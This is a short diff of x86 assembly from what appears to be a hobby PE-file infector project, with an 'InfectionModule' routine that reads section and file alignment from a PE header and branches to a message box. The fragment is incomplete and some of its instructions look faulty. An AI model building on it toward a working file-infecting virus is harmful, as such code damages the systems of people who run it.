@@ -19,14 +19,15 @@ getAddressofName:
 	add edx, ebx				
 	mov edx, [edx + 0xA0]       ; load sectionAlignment
 	add edx, ebx
-	mov esi, [edx + 0x04]       	; load fileAlignment
+	mov esi, [edx + 0x04]       ; load fileAlignment
 	add esi, ebx
 	xor ecx, ecx
-	push edx, esi
 
 InfectionModule:
 	mov edx, 0x04
-	call MessageBox
+	sub esi, edx
+	cmp esi, 0000000000004
+	jle MessageBox
 	call Exit
 	
 MessageBox:
